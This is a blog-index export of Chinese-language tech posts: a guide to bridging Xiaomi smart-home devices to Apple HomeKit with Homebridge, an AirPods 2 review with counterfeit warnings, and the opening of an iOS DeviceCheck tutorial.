HomeKit米家 LED 智慧檯燈 ：NT$ 995 僅支援米家詳細介紹可參考官網，兩盞都支援智慧控制、變色、調亮度、護眼，Pro版支援Apple HomeKit、三段角度調整；目前使用下來，以一盞燈的功能來說已經相當滿意，硬要挑一個缺點的話就是Pro版的角度調整只有底座能水平轉，燈不行，這樣就不能調整光線的角度了！理想的智慧家居目標：目前有的裝置： 米家智慧攝影機雲台版 1080P (支援：米家) 米家檯燈 Pro (支援：Apple HomeKit、米家) 米家 LED 智慧檯燈 (支援：米家)理想目標：回到家時： 自動關閉攝影機(為了隱私及防止誤觸看家警報，米家APP有BUG看家警報無法照設定時間開啟關閉)、打開電腦桌的Pro燈(不想摸黑)離家時： 自動打開攝影機(預設啟用看家)、關閉所有燈具本篇最終達成：離家、回家時發推播提醒，手機按一下觸發操作(已現有裝置沒辦法達到理想的自動化目標)智慧家居設定之路：Apple HomeKit 使用*僅限米家檯燈 Pro！米家檯燈 Pro！米家檯燈 Pro！這是最簡單的一部分，因為都是原生功能。只需四步驟 找到家庭APP（如沒有請到App Store搜尋「家庭」安裝） 打開家庭APP 點擊右上角「+」加入配近 掃描Pro檯燈底部HomeKit QRCode加入配件即可！加入配件成功後，在配件上重壓(3D TOUCH)/長壓，即可調整亮度、顏色。那不 支援Apple HomeKit的智慧家居怎麼使用第三方串接HomeKit？除了以上本身就支援的智慧裝置，那不支援Apple HomeKit的裝置是不是就完全無法透過家庭控制呢了？本章節手把手教你將不支援的裝置(攝影機、一般版檯燈)也加入到「家庭」中！ Mac ONLY，WIN使用者請直接跳到使用米家的章節 我的裝置是MacOS 10.14/iOS 12使用 HomeBridge ：HomeBridge透過使用Mac電腦作為橋接器，將不支援的裝置模擬成HomeKit設備，就可以加入到「家庭」的配件之中．運作比較可以看到一個重點就是 你要有一台Mac電腦保持開機狀態，才能保持橋接通道順暢 ；一但電腦關機、休眠，就無法控制那些HomeKit裝置。當然網路上也有神人做法，自行買一塊樹莓派來玩，將樹莓派當成橋接器；但這涉及到太多技術，本篇不會介紹。知道缺點後如果還想玩玩，可以繼續往下看或是跳到下一個直接使用米家的章節。第一步：安裝 node.js ： 點我 下載 ，安裝即可第二步：打開「終端機」輸入sudo npm -v查看node.js npm套件管理工具是否安裝成功：顯示出版本號即表示成功！第三步：透過 npm 安裝 HomeBridge套件：sudo npm -g install homebridge --unsafe-perm等待安裝完成後…HomeBridge工具就算裝完了！前面有提到 “HomeBridge就是透過使用Mac電腦作為橋接器，將不支援的裝置模擬成HomeKit設備”， 實際上HomeBridge只是一個平台，各裝置要加入要再另外找HomeBridge的外掛資源 。很好找，只要google或在github 搜尋「mija 產品英文名 homebridge」就會有許多資源；這邊介紹兩個我在用的裝置的資源：1.米家攝影機雲臺版資源： MijiaCamera攝影機是比較棘手的裝置，花了些時間研究並整理了一下；希望有幫助到有需要的人！首先ㄧ樣用「終端機」下命令安裝這MijiaCamera這個npm套件sudo npm install -g homebridge-mijia-camera安裝完成後，我們需要取得攝影機的網路 IP位址 跟 Token 兩個資訊打開米家APP → 攝影機 → 右上角「…」→設定→網路訊息，得到 IP位址 ！Token 資訊就比較麻煩了，需要你將手機連接到Mac上：打開 Itunes 介面選備份 不要勾替本機備份加密 ，點「立即備份」備份完成後， 下載 安裝備份查看軟體： iBackupViewer打開「iBackupViewer」，初次啟動會要你去 Mac「系統偏好設定」- 「安全性與隱私權」-「隱私權」-「+」- 加入「iBackupViewer」*如有隱私顧慮可關閉網路使用這套軟體、並在使用後移除再次打開「iBackupViewer」成功讀取到備份檔後，點擊右上角切換到「Tree View」模式左側會顯示你所有安裝的APP，找到米家的APP「AppDomain-com.xiaomi.mihome」-&gt;「Documents」在右側文件列表中找到並選擇 「 數字_mihome.sqlite」 這個檔案點擊右上角「Export」匯出 -&gt;「Selected」將剛剛匯出的sqlite檔案丟到 https://inloop.github.io/sqlite-viewer/ 查看內容可以看到所有米家APP上的裝置資訊欄位，向右滾動到尾端，找到 ZTOKEN 欄位，雙擊編輯全選複製最後再打開 http://aes.online-domain-tools.com/ 網站將 ZTOKEN 轉成最終 Token1.將剛剛複製出來的 ZTOKEN貼在「Input Text」，選「Hex」2.Key輸入「00000000000000000000000000000000」32個0，ㄧ樣選「Hex」3.然後按下「Decrypt!」轉換4.全選複製右下角藍匡＆去掉空格後就是我們要的結果 Token Token 這邊有嘗試用「miio」直接嗅探的方式，但好像是米家攝影機韌體有更新過，已無法用這個方法快速方便得到Token了！回到HomeBridge！編輯設定檔 config.json使用「Finder」-&gt;「前往」-&gt;「前往檔案夾」-&gt; 輸入「~/.homebridge」前往使用文字編輯器打開「config.json」，若沒有此檔案請自行建立一個或 點此下載 直接放進去{ \"bridge\":{ \"name\":\"Homebridge\", \"username\":\"CC:22:3D:E3:CE:30\", \"port\":51826, \"pin\":\"123-45-568\" }, \"accessories\":[ { \"accessory\":\"MijiaCamera\", \"name\":\"Mi Camera\", \"ip\":\"\", \"token\":\"\" } ]}在config.json裡加入以上內容，IP 及 Token部分帶入上面取得的資訊。這時候再次回到「終端機」下以下命令啟動 HomeBridgesudo homebridge start如果已啟動之後又更改了config.json內容的話可以改下：sudo homebridge restart重新啟動這時會出現HomeKit QRCode 讓您掃描加入配件（步驟如上面提到的，Apple HomeKit裝置加入方式）下方也會有狀態訊息：[2019–7–4 23:45:03] [Mi Camera] connecting to camera at 192.168.0.100…[2019–7–4 23:45:03] [Mi Camera] current power state: off有出現這些＆沒出現錯誤error訊息即表示設定成功！一般常見的錯誤都是Token有錯，確認一下上面流程有無遺漏即可。現在你就可以從「家庭」APP中開關米家智慧攝影機囉！2.米家 LED 智慧檯燈 HomeBridge 資源： homebridge-yeelight-wifi再來是米家 LED 智慧檯燈，由於不像Pro版有支援Apple HomeKit，所以我們還是要用HomeBridge的方法來加入；雖然步驟 不需經過繁瑣流程取得IP、Token ，相對攝影機來說較簡單，但檯燈有檯燈的坑，要用另一個YeeLight APP配對後將區域網路控制設定打開：這點不得不吐槽一下這個糟糕的整合性，原生米家APP是無法做這項設定的；所以請到APP Store搜尋「 Yeelight 」APP 下載＆安裝開啟APP -&gt; 直接使用米家帳號登入 -&gt; 增加裝置 -&gt; 米家檯燈 -&gt; 照指示將檯燈改綁定到 Yeelight APP裝置綁定完成後回到「裝置」頁 -&gt; 點「米家檯燈」進入 -&gt; 點右下角「△」Tab -&gt; 點「局域網控制」進入設定 -&gt; 打開按鈕允許局域網(區域網路)控制檯燈的設置到這裡即可，你可以保留這個APP控制檯燈或再重新綁定回米家．再來是HomeBridge設定；ㄧ樣先打開「終端機」下命令安裝 homebridge-yeelight-wifi npm套件sudo npm install -g homebridge-yeelight-wifi安裝完成後同上攝影機的步驟，前往 ~/.homebridge 資料夾，建立或編輯修改 config.json，這次只需要在最後一個}裡面加上\"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]即可！最後結合上述攝影機的 config.json檔如下：{ \"bridge\": { \"name\": \"Homebridge\", \"username\": \"CC:22:3D:E3:CE:30\", \"port\": 51826, \"pin\": \"123-45-568\" }, \"accessories\": [ { \"accessory\": \"MijiaCamera\", \"name\": \"Mi Camera\", \"ip\": \"\", \"token\": \"\" } ], \"platforms\": [ { \"platform\" : \"yeelight\", \"name\" : \"yeelight\" } ]}然後一樣回到「終端機」下：sudo homebridge start或sudo homebridge restart即可看到原本不支援的米家 LED 智慧檯燈也加入HomeKit「家庭」APP囉！而且同樣支援顏色、光度調整！HomeKit配件都加好了，怎麼讓他智慧呢？全都加好、橋接好後ㄧ樣打開「家庭」APP依照步驟新增場景情境，這裡以回家為例：右上角點擊「+」-&gt; 加入情境 -&gt; 自訂 -&gt; 配件名稱自行輸入(EX:回家) -&gt; 點下方「加入配件」-&gt; 選擇已串接好的HomeKit配件 -&gt; 設定這個場景時的配件狀態(攝影機：關/臺燈：開) -&gt; 可點「測試情境」進行測試 -&gt; 右上角「完成」！這樣就設定好場囉～這時候在首頁點場景就換執行裡面所有配件的設定！還有一個快捷小撇步，就是在上拉控制選單直接點房子形狀的按鈕快速操作HomeKit/執行情境(右上可切換模式)！智慧有了，那怎麼自動化呢？智慧已經有了，現在我想要達成終極目標，回家自動關閉攝影機、開燈；離家自動開攝影機、關燈．切到第三個Tab「自動化」就可設定，很抱歉這邊沒有一個上述設備(iPad/Apple TV/HomePod)可以做 ” 家庭中樞 ” 所以這塊我就沒研究了。原理好像是回到家，感應到 ”家庭中樞” 手機/手錶即可精準觸發！這邊我有找到一個tricky的做法：(感應GPS)使用第三方的APP串接「家庭」加入自動化設定，就可以透過使用手機GPS定位來做到自動化破解封鎖使用「自動化」Tab的功能p.s GPS會有約100公尺的誤差這邊我使用的第三方串接APP是： myHome Plus下載＆安裝後開啟APP -&gt; 允許存取「家庭資料」-&gt; 會看到「家庭」的資料配置 -&gt; 點選右上角「設定按鈕」-&gt; 點「我家」進入 -&gt;下拉到「Triggers」區域 -&gt; 點「Add Trigger」Trigger 類型選「Location」-&gt; Name 輸入名字(EX:回家) -&gt; 點「Set Location」設定位置區域 -&gt; 再來 REGION STATUS 可以設定是進入還是離開該區域 -&gt; 最後 SCENES 可以選擇對應要執行的「情景」(上面建立的)按右上角「完成」儲存後，再回到「家庭」APP，可以看到「自動化」Tab 被打開可以用了！這時候就可以選擇右上角「＋」使用「家庭」APP直接新增自動化腳本！！步驟也如第三方APP，不過整合性更佳！使用原生「家庭」APP建立好自動化後也可以滑動刪除剛剛用第三方APP建的。 ！！僅需注意，至少要保留一項；否則Tab就會回到原始封鎖狀態！！Siri 語音控制的部分：相較下面介紹的米家，HomeKit的整合性相當高，可直接使用語音控制設定的配件、執行場景，無需額外，無需額外設定。HomeKit的設定介紹就到這邊了，再來講解米家原生智慧家庭的用法。使用米家本身搭建智慧家庭的方法：這邊遇到一個困惑點，就是我在米家新增設備中找不到長得一樣的米家檯燈，答案就是：看字就好，這個就是其他設備：攝影機、Pro檯燈就直接照官方說明設定加入就好，這邊不在冗述．場景情境設定：同「家庭設定方式」-&gt; 切換到「智慧」Tab -&gt; 選擇「手動執行」-&gt; 下方選擇裝置操作(由於是原生所以可選更多功能) -&gt; 繼續增加其他裝置(檯燈) -&gt; 「儲存」完成！ 一定會有人想問為什麼不直接選「離開或到達某地」？，因為這功能根本沒用，他APP沒針對台灣優化GPS是錯的，而且他的定位只能定在地標上，如果你的位置有那可以直接使用此功能， 文章後續也都可跳過！ 冷知識： Google Maps 裡的中國地圖全是錯的！快捷開關部分，可以從「我的」-&gt;「小元件」設定小工具元件！這樣就能從通知中心快速執行場境、裝置囉！也可從 Apple Watch 上控制元件！*如果手錶APP一直出現空白請刪除重裝手錶或手機APP，這個APP真的蠻多BUG的智慧有了，那怎麼自動化呢？這邊ㄧ樣要使用GPS感應方式， 如果上述新增場景用的就是「離開或到達某地」，以下介紹設定都可略過囉！* * * * *[2019/09/26] 更新 iOS ≥ 13 只使用內建 捷徑 APP 達成自動化 :iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居，點擊前往查看&gt;&gt;* * * * * iOS ≥ 12，iOS &lt; 13 Only : 使用內建的捷徑APP搭配IFTTT首先到「我的」-&gt; 「實驗室功能」-&gt;「iOS 捷徑」-&gt; 「將米家場景加入捷勁」打開系統內建的「 捷徑 」APP（若找不到請到App Stroe 搜尋下載回來）點擊右上角「+」建立捷徑 -&gt; 點右上完成下方的設定按鈕 -&gt; 名稱 -&gt; 輸入名稱（建議用英文，因為等等還要用到）回到新增捷徑頁面 -&gt; 在下方選單輸入搜尋「米家」-&gt; 加入對應的在米家設定的場景，關閉「執行時顯示」否則執行完會開啟米家APP。 *如果找不到米家請回到米家APP嘗試開關「我的」-&gt; 「實驗室功能」-&gt;「iOS 捷徑」-&gt; 「將米家場景加入捷勁」、滑掉「捷徑」APP重開。這時候又要使用第三方APP了，我們使用IFTTT做GPS進入、離開的背景觸發器，到App Store搜尋「 IFTTT 」下載＆安裝。打開IFTTT、登入帳號後，切換到「My Applets」Tab，點右上角「+」新增-&gt;點擊「+this」-&gt; 搜尋「Location」-&gt; 選擇是進入還是離開設定位置 -&gt; 點擊「Create trigger」確定 -&gt; 換點下面「+that」-&gt; 搜尋「notification」選擇「Send a rich notification from the IFTTT app」：Title = 通知標題 , Message = 通知內容Link URL 請輸入：shortcuts://run-shortcut?name= 捷徑名稱所以才說捷徑名稱盡量設英文比較好-&gt; 點選「Create action」-&gt; 可點選「Edit title」設定名稱-&gt; 「Finish」儲存完成！當你下次離開/進入設定的區域範圍就會收到觸發的通知(一樣有約100公尺的誤差範圍)，點選通知後就會自動執行米家場景囉！點選通知就會在背景自動執行場景Siri 語音控制的部分：由於米家不是Apple內建APP，所以要支援Siri語音控制就得另外設置：在「智慧」Tab -&gt; 「加入Siri」-&gt; 選擇「目標場景」按「加入Siri」-&gt; 點紅色錄製指令(EX:關燈) -&gt; 完成！即可在Siri中直接呼叫控制執行場景！總結上述一大堆的設定步驟，總結一下就是：如果要好的體驗就是得花大錢買有HomeKit標誌的電器（就可不需放台Mac做HomeBridge開機待命，直接與原生Apple 家庭功能完美結合）還有要再買HomePod或Apple TV、iPad做家庭中樞；不管是HomeKit標誌的電器、家庭中樞都不便宜！如果有技術能力可考慮使用第三方智慧裝置（如米家）搭配樹莓派做HomeBridge。如果像我一個就是個普通人那還是直接用米家最為方便上手，目前的使用習慣是回家、離開家會從通知中心點快捷小工具執行場景操作；捷徑APP搭配IFTTT的部份僅作為通知提醒，怕有時候忘記。目前體驗雖沒達到目標理想，但已經離 “智慧家庭” 更進一步了！進階篇示範使用樹莓派當 HomeBridge 主機，將所有米家家電串上 HomeKit延伸閱讀 小米智慧家居新添購（AI音箱、溫濕度感應器、體重計2、直流變頻電風扇） iOS ≥ 13.1 使用「捷徑」自動化功能搭配米家智慧家居（直接使用 iOS ≥ 13.1 內建的捷徑APP完成自動化操作） 米家 APP / 小愛音箱地區問題有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 35,492 Total Views Last Statistics Date: 2025-01-19 | 35,478 Views on Medium. " }, { "title": "AirPods 2 開箱及上手體驗心得", "url": "/posts/33afa0ae557d/", "categories": "ZRealm Life.", "tags": "airpods, 3c, 開箱, airpods2, 生活", "date": "2019-05-01 21:32:20 +0800", "snippet": "AirPods 2 開箱及上手體驗心得 (雷射鐫刻版)更加巧妙，無比驚歎。[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往AirPods 這款產品剛出來時，我並沒有特別注意；第一眼看覺得就是個像蓮蓬頭的無線藍牙耳機，而且那時候無線藍牙耳機市場也是百家齊放的狀態，你能想到的款式、需求都能找到相符的產品再加上價格也不親民，有什麼特別的？...", "content": "AirPods 2 開箱及上手體驗心得 (雷射鐫刻版)更加巧妙，無比驚歎。[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往AirPods 這款產品剛出來時，我並沒有特別注意；第一眼看覺得就是個像蓮蓬頭的無線藍牙耳機，而且那時候無線藍牙耳機市場也是百家齊放的狀態，你能想到的款式、需求都能找到相符的產品再加上價格也不親民，有什麼特別的？直到我真正上手後才感受到它的 「驚艷」 之處，自從開賣之後 AirPods 長年霸佔藍牙耳機銷售排行榜前幾名絕非浪得虛名，靠的也不只是果粉的信仰，那到底好用在哪，讓我們繼續看下去．真香梗入手背景本來只是單純的iPhone用戶，去年入手了MacBook Pro、 Apple Watch S4 ，開始陷入蘋果生態系（俗稱：蘋果全家桶）手錶都買了，獨缺一副耳機。原本在使用的藍牙耳機已服役一段時間，就是款中規中矩的耳機，沒有不好但也沒特別出色，音質普普、續航力很夠；要說痛點的話就是通話時不清楚、訊號容易干擾，開關機要長按、要等配對及電量標示不清楚，都是小小問題；平常就通勤跟運動時使用，在電腦前多半使用喇叭或有線耳機，所以也能滿足我的基本需求．AirPods 1代推出後，身邊朋友的使用經驗多半好評，這次剛好跟上AirPods 2代的潮流，所以就順勢入手囉．p.s. 因為我沒使用過 1代 所以考量入手的點也不會是跟 1代 做比較有什麼提升的項目 (本篇文章也不會提及跟1代的差異)．挑選，無線還是有線版本？無線及有線版本價格差$1,200，起初我是考慮買無線版本的；想到我那凌亂的床頭櫃上的充電線還有出國能少帶條線，對便利性提升來說很是心動！！蘋果宣告 AirPower 胎死腹中後，我在網路尋找類似的產品，買了款 2合1的無線充電版，2 是 iPhone、Apple Watch；因iPhone跟AirPods不太會隨時或同時需要充電，所以交替使用下是能3合1使用的．一切都看似美好，直到我下標收到貨之後，實際使用發現無法同時充手機跟手錶，手錶的充電量幾乎=0、而且速度很慢，電流根本催不起來！就算使用 5.1V/2.1A 的大豆腐頭也是，不確定該搭什麼電壓的頭才能使用，查 網友評價 ，這個狀況也非個案，最後還是悻悻然的退貨了．想想也不過就兩條線(AirPods跟iPhone都是lightning/AppleWatch是專用線)，而且速度還是有線快；無線需要那塊版本+版子的線+可能要更大的頭?；比較之下沒有特別便利優勢．所以最終我選擇了有線版的AirPods 2。 p.s. 無線版跟有線版的差別只在，充電盒有線版同1代(指示燈在內)；無線版的充電盒指示燈在外&amp;也能用有線充下單從發佈到開賣(台灣)，大約隔了1個月，每天都要照三餐上官網看開賣沒，相信很多網友也是XD；實在等的揪心，其他國家早就開賣了！4/23 開賣就立馬下標了，AirPods 2 這次可以雷射鐫刻(刻字)當然不免俗的也刻了：ΛVICII ◢ ◤ — 官方預覽圖 以此紀念 瑞典傳奇音樂製作人 AVICII “One day you’ll leave this world behind So live a life you will remember.” Avicii — The Nights可以刻 11個字元 ，包含中文/英文/符號/空格；實測符號部分應該大部分都可，不支援他會顯示「無法鐫刻這些字元：」，所以不需要擔心變亂碼．p.s 有刻字約需多等一週，不刻字可到101直接買或透過經銷商購買(價格更便宜)官方給的預估收到時間是：5/3~5/10，4/29通知從上海出貨，很幸運地4/30趕在51勞動節放假前我就收到了(超快！！從上海到台北)開箱！外包裝展開本體近照本體全身照肚子裡的東西亂開箱結束！整體拿起來有份量，手感跟質感非常好，刻字部分也很精細；是蘋果產品該有的水準！使用第一次使用：全新AirPods第一次使用時只需打開 AirPods盒子 靠近 iPhone 就會詢問，即可完成配對；不用特別案配對按鈕。設定耳機操作：手機版：打開「設定」-&gt;「藍芽」-&gt;「找到你的AirPods」-&gt;「設定」MacBook 版：左上角「」-&gt;「系統偏好設定」-&gt;「藍芽」(若沒聲音請將聲音書出改選AirPods)可自行選擇左右耳的雙擊的動作．點擊位置在耳機本體上側邊小孔下方：其實我摸索了一下才知道位置一些小技巧快速切換回iPhone上使用：上拉選單-&gt;選擇音訊區塊-&gt;選擇右上圖標-&gt;切換選擇AirPods也可由此查看AirPods電量。（顯示電量較低的那隻的電量）用小工具查看電量方法：左滑到控制中心-&gt;下方「編輯」-&gt;找到「電池」新增並排序以後就能直接左滑控制中心查看AirPods電量（顯示電量較低的那隻的電量）要看左右耳及盒子的電量，就需將其中一隻AirPods放回盒子並打開盒子（因為盒子本身沒有藍芽功能）：*盒子內是我貼的防塵貼片 這裡有一個BUG，如果你的電池小工具顯示電量一下之後就消失；請去「設定」-&gt;「螢幕顯示與亮度」-&gt;「文字大小」-&gt; 調回預設大小（第三格）即可！Apple Watch 查看電量方法：上滑控制中心-&gt;點擊電量Apple Watch 上電量顯示視窗下方會多顯示AirPods的電量p.s.但好像有 BUG 有時候不會顯示關於電量的補充： 1.當 AirPod 電池電量低時，您會在其中一個或兩個 AirPods 中聽到提示音。當電池電量低時，您會聽到一次提示音，在 AirPods 關閉前，會再聽到一次提示音。 2.如果 AirPods 放在充電盒中而且盒蓋開著，指示燈顯示的是 AirPods 的充電狀態。如果 AirPods 不在充電盒中，指示燈顯示的是充電盒的狀態。綠色表示已充飽電，而琥珀色表示剩不到一次充飽電的電量。— 取自 官網的文件使用心得在寫心得之前，先提一個最近聽到的創業故事；簡而言之就是：「做產品時我們應該要做的不是針對大範圍、而是選擇一個小範圍的點，然後慢慢擴散」AirPods 與其他廠牌的藍牙耳機最大的差異就是小範圍的細節體驗無話可說，像是使用時拿掉一耳會自動暫停音樂，戴回去會恢復播放這些，還有拿出來就能直接用，不用就放回去，不用去管那些開機關機連線的問題，舒適度方面，佩戴起來甚至感覺不到他的存在．充電速度飛快，加上放在盒子內就會自動充電；所以只要稍微注意盒子還有沒有電就好(盒子約可充5次)，不太會遇到像之前要用藍牙耳機時它卻沒電，然後還要等它慢慢充電。延遲就如傳言一樣，看影片、玩遊戲幾乎感覺不到延遲(我測試玩的是極速領域賽車遊戲)．Hey Siri 的部分 ，起初也覺得很雞肋，因為我有手錶也能遠距離Hey Siri；實際體驗後同上提到的，一切都是「細節體驗」；AirPods的Hey Siri又更上了一個層級，連抬手呼出都不用；直接呼叫Hey Siri就能使用，真的達到Siri無所不在的感覺。可能遇到的場景就是在整理家務、雙手都拿東西時；這時候這個功能就相當方便！還有還有，可以 呼叫Siri調節音量 ：「Hey Siri! ，大聲一點」、「Hey Siri! ，音量調到75%」一句話來總結使用 AirPods 的心得就是： 「一切都是那麼的自然」你無需花心思在那些不必要的事物上，耳機就該只是耳機。通話品質部分 也是同樣驚艷，除了基本的通話品質穩定之外，收音效果堪比話筒品質，真的超神奇；實測跟朋友通話，他甚至聽不太出來我用的是AirPods！騎車配戴部分 ，其實我本來很期待能騎車時帶著聽導航，結果已入手1代的朋友說「不行」，3/4以上的安全帽，再帶帽子的過程會壓到耳朵，耳機很容易掉；這邊實際測試也是，心抖了一下，建議真的要邊騎車邊聽導航，只帶ㄧ耳就好，穿脫安全帽時只顧一耳比較安全。缺點：最終還是要說一下我覺得的缺點手勢可控制的項目太少…我真的很習慣手勢控制大小聲（不過還好這部分有手錶可以控制Spotify音量）另外手機連接速度的確很快但電腦的連接速度：我的MacBook Pro 2018 蠻慢的、但另一台Mac Mini跟手機連接一樣快TESTV 評測頻道也有提到它的MacBook Pro在蓋起來外接使用時，搭配AirPods訊號會斷斷續續的！（這部分我不會）不過，為什麼有這些差異？我猜是因為有其他信號干擾（燈、螢幕輸出、其他藍芽設備）吧？闢謠： 大小外型跟有線earpodsㄧ樣、容易掉的問題：首先大小外型跟earpods有差距，我戴earpods有點鬆鬆的，但戴AirPods感覺很穩，跳來跳去也不會掉；不過其實很看人，有的人的確會出現不合適的問題，建議購買前先跟有AirPods的朋友借來戴戴看！*或是在耳機頭部貼一些人工皮增加面積、阻力 音質跟earpods很像：同上，其實差很多，AirPods的音質好很多；我覺得雖然可能跟同價位主打音質的耳機有落差，也無降噪功能，但AirPods本身就不是音質取向的耳機，取捨就看個人。就我個人體驗，音質聽得出環繞層次、音域廣，整體不失水準！配件：由於在下奶油手，AirPods就跟一顆雞蛋ㄧ樣，我很怕會溜手直接摔爆；爬了許多保護套推薦文，蠻多人推薦這款：Catalyst AirPods 防水收納盒(保護套)會選擇這個的原因是：防水、防摔、有掛勾、使用便利（拿收耳機跟充電時不用拆）價格：$1000上下 [![開箱 Catalyst Airpods專用的耳機收納保護套 Apple earphone](/assets/33afa0ae557d/7645_hqdefault.jpg “開箱 Catalyst Airpods專用的耳機收納保護套 Apple earphone”)](http://www.youtube.com/watch?v=XD8Lvp1vR1M){:target=”_blank”} 小開箱：正面，因為怕髒所以我買深色背面也有相對應配對鍵的按鈕拿收耳機只需翻開上半部底部充電孔有蓋子可開關p.s. 為了要拿到AirPods能馬上用，其實我套子比AirPods先買好😂網友提問：1代與2代保護套是否能共用？區分這個的標準不是1或2代，而是有線或無線版；如果您是有線版那1、2代都能用，無線版的指示燈在外及背面配對設定按鍵位置較上居中，無法與有線版共用保護套，這部分需要注意⚠️再來是盒子內部防塵貼：AHA AirPods 防塵貼有網友問到密合度問題：沒貼好會有點不密合，我橋很久才讓他完全密合；邊邊稍微有一點點刮手感（不影響，可能是公差？）不太好貼，因為防塵貼是金屬片，盒子本身有磁鐵容易在瞄準的時候就被吸下去目前覺得有點多餘，不知道使用一陣子後的效果如何，所以先持保留態度。防詐騙宣導請大家要特別注意，對岸已經出現破解晶片的高仿版本，配對同樣有動畫、同樣有電量顯示，從外觀幾乎無法區別的山寨版。目前主要的識別方式是從軟體下手： 電量顯示：正版能顯示左耳、右耳、盒子三個電量/盜版只有ㄧ個 藍牙設定那邊，正版可以設定左右耳的點擊功能/盜版只有斷開和遺忘 充電盒指示燈正版連上後會熄/盜版會繼續亮著但以上都不確定之後山寨版會不會修正，所以大家還是以官方或大型通路渠道購買較安全．⚠️不孝商人現在更猖獗了，把盜版用接近正版的價格賣⚠日前在Facbook、Google廣告聯播網上發現有惡劣商人，將盜版用接近正版價格賣(網站是常見的 一頁式詐騙網頁 )，非常惡劣；我覺得如果你是貪小便宜花個1000出買到AirPods你自己應該也要有認知會是假的，但把盜版當正版價格賣實在非常低級！ 請注意，全新的AirPods價格應該不會低於$4500。詐騙、來源不明的賣家如果你不小心下標了，取貨付款請直接拒收、已收請趕快打電話給貨運公司要求退貨（態度要強硬），有任何問題可加入 FB購物廣告受害者自救會 。看到這類廣告請直接點右上角向Facebook/Google檢舉、或是狂點廣告讓他快速的燒完廣告預算。另外請大家發現山寨的AirPods或蘋果產品不要姑息養奸，無論是來路不明的網站、一頁式購物詐騙、蝦皮、露天，絕對要 聯繫保智大隊 去處理。亦或是1代當2代賣？二代外盒圖請確認： AirPods 2型號： A2031、A2032 AirPods 1型號： A1523、A1722 生產年份：≥ 2019詳細1、2代比較請參考這篇： AirPods 第一代與第二代辨識技巧大公開，透過這5 招馬上區分出來其他有趣的開箱及體驗影片來個全家桶吧想知道Apple Watch Series 6 的上手體驗嗎？Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往有任何問題及指教歡迎 與我聯絡 。===本文首次發表於 Medium ➡️ 前往查看Follow Me on Medium 981+ Followers 37,530 Total Views Last Statistics Date: 2025-01-19 | 37,258 Views on Medium. " }, { "title": "iOS 完美實踐一次性優惠或試用的方法 (Swift)", "url": "/posts/c5e7e580c341/", "categories": "ZRealm Dev.", "tags": "ios, ios-app-development, ios-11, swift, mobile-app-development", "date": "2019-04-29 23:30:01 +0800", "snippet": "iOS 完美實踐一次性優惠或試用的方法 (Swift)iOS DeviceCheck 跟著你到天涯海角在寫上一篇 Call Directory Extension 時無意間發現這個冷門的API，雖然已不是什麼新鮮事(WWDC 2017時公布/iOS ≥11支援)、實作方面也非常簡易；但還是小小的研究測試了一下並整理出文章當做個紀錄．DeviceCheck 能幹嘛？ 允許開發者針對使用者的裝...", "content": "iOS 完美實踐一次性優惠或試用的方法 (Swift)iOS DeviceCheck 跟著你到天涯海角在寫上一篇 Call Directory Extension 時無意間發現這個冷門的API，雖然已不是什麼新鮮事(WWDC 2017時公布/iOS ≥11支援)、實作方面也非常簡易；但還是小小的研究測試了一下並整理出文章當做個紀錄．DeviceCheck 能幹嘛？ 允許開發者針對使用者的裝置進行識別標記自從 iOS ≥ 6 之後開發者無法取得使用者裝置的唯一識別符(UUID)，折衷的做法是使用IDFV結合KeyChain(詳細可參考之前 這篇 )，但在 iCloud 換帳號或是重置手機…等狀況下，UUID還是會重置；無法保證裝置的唯一性，如果以此作為一些業務邏輯的儲存及判斷，例如：首次免費試用，就可能發生使用者狂換帳號、重置手機，可不斷無限試用的漏洞．DeviceCheck 雖然不能讓我們得到保證不會改變的UUID，但他能做到「 儲存」 的功能，每個裝置Apple提供2 bits的雲端儲存空間，透過傳送裝置產生的臨時識別Token給Apple，可寫入/讀取那2 bits的資訊。2 bits? 能存什麼？只能組合出4種狀態，能做的功能有限．與原本儲存方式比較：✓ 表示資料還在p.s. 這邊小弟犧牲了自已的手機實際做了測試，結果吻合；就算我登出換iCloud、清出所有資料、還原所有設定、回到原廠初始狀態，重新安裝完APP都還是能取到值．主要運作流程如下：iOS APP 這邊透過DeviceCheck API產生一組識別裝置用的臨時Token，傳給後端再經由後端組合開發者的private key資訊、開發者資訊成JWT格式後轉傳給Apple伺服器；後端取得Apple回傳結果後處理完格式再丟回iOS APP．DeviceCheck 的應用附上 DeviceCheck 在 WWDC2017 上的截圖：因 每個裝置只能存2 bits的資訊 ，所以能做的項目差不多就如官方所提及的應用包含裝置是否曾經已試用過、是否付費過、是否是拒絕往來戶…等等；且只能實現一項．支援度： iOS ≥ 11開始！了解完基本資訊後，讓我們開始動手做吧！iOS APP 端：import DeviceCheck//....//DCDevice.current.generateToken { dataOrNil, errorOrNil in guard let data = dataOrNil else { return } let deviceToken = data.base64EncodedString() //... //POST deviceToken 到後端，請後端去跟蘋果伺服器查詢，然後再回傳結果給APP處理}如流程所述，APP要做的只有取得臨時識別Token（ deviceToken ）！再來就是將deviceToken發送到後端我們自己的API去處理．後端：重點在後端處理的部分1.首先登入 開發者後台 記下 Team ID2. 再點側欄的 Certificates, IDs &amp; Profiles 前往憑證管理平台選擇「Keys」-&gt; 「All」-&gt; 右上角「+」新增Step 1.建立新Key，勾選「DeviceCheck」Step 2. 「Confirm」確認Finished.最後一步建立完成後， 記下 Key ID 及點擊「Download」下載回 privateKey.p8 私鑰檔案．這時候你已經準備齊全了所有推播所需資料： Team ID Key ID privateKey.p83. 依Apple規範組合 JWT(JSON Web Token) 格式演算法： ES256//HEADER:{ \"alg\": \"ES256\", \"kid\": Key ID}//PAYLOAD:{ \"iss\": Team ID, \"iat\": 請求時間戳(Unix Timestamp,EX:1556549164), \"exp\": 逾期時間戳(Unix Timestamp,EX:1557000000)}//時間戳務必是整數格式！取得組合的JWT字串：xxxxxx.xxxxxx.xxxxxx4. 將資料發送給Apple伺服器＆取得回傳結果同APNS推播有分開發環境跟正式環境： 1.開發環境：api.development.devicecheck.apple.com （不知道為什麼我開發環境發送都會回傳失敗） 2.正式環境：api.devicecheck.apple.comDeviceCheck API 提供兩個操作： 